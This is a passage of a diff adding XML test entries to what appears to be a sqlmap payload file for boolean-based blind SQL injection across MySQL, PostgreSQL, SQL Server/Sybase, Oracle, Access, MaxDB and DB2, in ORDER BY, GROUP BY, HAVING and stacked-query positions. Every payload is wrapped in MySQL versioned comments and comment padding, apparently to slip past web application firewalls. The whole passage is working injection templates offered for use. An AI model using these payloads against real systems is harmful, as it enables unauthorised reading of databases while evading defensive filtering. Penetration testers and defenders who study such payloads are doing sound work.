+        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END))/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt; 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/(SELECT/**_**/*/ /*!500000)/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/(SELECT/**_**/*/ /*!500000)/**_**/*/ /*!50000END))/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/(SELECT/**_**/*/ /*!500000)/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <!-- It exclusively works with ORDER BY -->
+    <test>
+        <title>PostgreSQL boolean-based blind - ORDER BY clause (original value)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/(SELECT/**_**/*/ /*!500000)/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/(SELECT/**_**/*/ /*!500000)/**_**/*/ /*!50000END))/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/(SELECT/**_**/*/ /*!500000)/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <!--
+         TODO: this would work for GROUP BY too if sqlmap did not enclose string-based [ORIGVALUE] with single quotes, but then other payloads would break.
+               It already works for ORDER BY because it accepts int whereas GROUP BY only accepts format [table].[column] so [ORIGVALUE] must where it is
+    -->
+    <test>
+        <!-- <title>PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause (GENERATE_SERIES - original value)</title> -->
+        <title>PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <!-- <clause>2,3</clause> -->
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END)/**_**/*/ /*!50000LIMIT/**_**/*/ /*!500001)/**_**/*/</vector>
+        <request>
+            <payload>,(/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END)/**_**/*/ /*!50000LIMIT/**_**/*/ /*!500001)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,(/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END)/**_**/*/ /*!50000LIMIT/**_**/*/ /*!500001)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</vector>
+        <request>
+            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ /*!50000[/*!50000RANDNUM1]/**_**/*/)/**_**/*/ /*!50000END))/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle boolean-based blind - ORDER BY, GROUP BY clause</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST(1/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT)/(SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/</vector>
+        <request>
+            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST(1/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT)/(SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST(1/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT)/(SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST(1/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT)/(SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/</vector>
+        <request>
+            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST(1/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT)/(SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST(1/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT)/(SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/ /*!50000END)/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,/*!50000IIF(/*!50000[INFERENCE]/**_**/*/,1,1/0)/**_**/*/</vector>
+        <request>
+            <payload>,/*!50000IIF(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,1,1/0)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,/*!50000IIF(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/,1,1/0)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,/*!50000IIF(/*!50000[INFERENCE]/**_**/*/,/*!50000[ORIGVALUE]/**_**/*/,1/0)/**_**/*/</vector>
+        <request>
+            <payload>,/*!50000IIF(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,/*!50000[ORIGVALUE]/**_**/*/,1/0)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,/*!50000IIF(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/,/*!50000[ORIGVALUE]/**_**/*/,1/0)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>Microsoft Access</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END)/**_**/*/</vector>
+        <request>
+            <payload>,(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END)/**_**/*/</vector>
+        <request>
+            <payload>,(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>SAP MaxDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 boolean-based blind - ORDER BY clause</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000RAISE_ERROR(70001,/**_**/*/ '/*!50000[/*!50000RANDSTR]/**_**/*/')/**_**/*/ /*!50000END/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSIBM.SYSDUMMY1)/**_**/*/</vector>
+        <request>
+            <payload>,(/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000RAISE_ERROR(70001,/**_**/*/ '/*!50000[/*!50000RANDSTR]/**_**/*/')/**_**/*/ /*!50000END/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSIBM.SYSDUMMY1)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,(/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000RAISE_ERROR(70001,/**_**/*/ '/*!50000[/*!50000RANDSTR]/**_**/*/')/**_**/*/ /*!50000END/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSIBM.SYSDUMMY1)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 boolean-based blind - ORDER BY clause (original value)</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,(/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000RAISE_ERROR(70001,/**_**/*/ '/*!50000[/*!50000RANDSTR]/**_**/*/')/**_**/*/ /*!50000END/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSIBM.SYSDUMMY1)/**_**/*/</vector>
+        <request>
+            <payload>,(/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000RAISE_ERROR(70001,/**_**/*/ '/*!50000[/*!50000RANDSTR]/**_**/*/')/**_**/*/ /*!50000END/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSIBM.SYSDUMMY1)/**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>,(/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000ORIGVALUE]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000RAISE_ERROR(70001,/**_**/*/ '/*!50000[/*!50000RANDSTR]/**_**/*/')/**_**/*/ /*!50000END/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSIBM.SYSDUMMY1)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <!-- Works in MySQL, Oracle, etc. -->
+    <test>
+        <title>HAVING boolean-based blind - WHERE, GROUP BY clause</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2</clause>
+        <where>1</where>
+        <vector>/*!50000HAVING/**_**/*/ /*!50000[/*!50000INFERENCE]/**_**/*//**_**/*/</vector>
+        <request>
+            <payload>/*!50000HAVING/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*//**_**/*/</payload>
+        </request>
+        <response>
+            <comparison>/*!50000HAVING/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*//**_**/*/</comparison>
+        </response>
+    </test>
+    <!-- End of boolean-based blind tests - ORDER BY, GROUP BY clause -->
+
+    <!-- Boolean-based blind tests - Stacked queries -->
+    <test>
+        <title>MySQL &gt;= 5.0 boolean-based blind - Stacked queries</title>
+        <stype>1</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END)/**_**/*/</vector>
+        <request>
+            <payload>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END)/**_**/*/</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000RANDNUM]/**_**/*/=/*!50000[RANDNUM1]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END)/**_**/*/</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt; 5.0 boolean-based blind - Stacked queries</title>
+        <stype>1</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[/*!50000INFERENCE]/**_**/*/)/**_**/*/ /*!50000THEN/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*/*(SELECT/**_**/*/ /*!50000[/*!50000RANDNUM]/**_**/*//**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA.PLUGINS)/**_**/*/ /*!50000END)/**_**/*/</vector>
+        <request>
